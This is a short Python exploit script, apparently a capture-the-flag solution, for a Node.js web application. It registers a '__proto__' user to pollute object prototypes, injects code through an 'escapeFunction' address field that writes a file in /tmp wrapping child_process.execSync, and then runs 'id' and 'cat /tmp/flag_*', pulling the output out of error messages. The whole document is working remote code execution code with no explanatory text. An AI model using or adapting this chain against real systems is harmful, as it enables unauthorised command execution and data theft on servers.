#!/usr/bin/env python3  
  
import re  
import requests  
  
target_url = "<url>"  
  
s = requests.Session()  
  
r = s.post(target_url + "/register", data={"username": "__proto__", "password": "asdf"})  
  
r = s.post(target_url + "/address", data={"addressId": "client", "Fulladdress": "1"})  
payload = """process.mainModule.require("fs").writeFileSync("/tmp/rootxran.js", "function RCE( key ){ \\n const result = process.mainModule.require('child_process').execSync(`${key}`); \\n throw new Error(`Result leak from Error: ${result.toString()}`); \\n}\\n module.exports = RCE;");"""  
r = s.post(target_url + "/address", data={"addressId": "escapeFunction", "Fulladdress": payload})  
  
payload = """process.mainModule.require("/tmp/rootxran.js")("id");"""  
r = s.post(target_url + "/address", data={"addressId": "escapeFunction", "Fulladdress": payload})  
pattern = r'Result leak from Error: (.*?)<br><br>'  
match = re.search(pattern, r.text, re.DOTALL)  
print(match.group(1).strip())  
  
payload = """process.mainModule.require("/tmp/rootxran.js")("cat /tmp/flag_*");"""  
r = s.post(target_url + "/address", data={"addressId": "escapeFunction", "Fulladdress": payload})  
pattern = r'Result leak from Error: (.*?)<br><br>'  
match = re.search(pattern, r.text, re.DOTALL)  
print(match.group(1).strip())
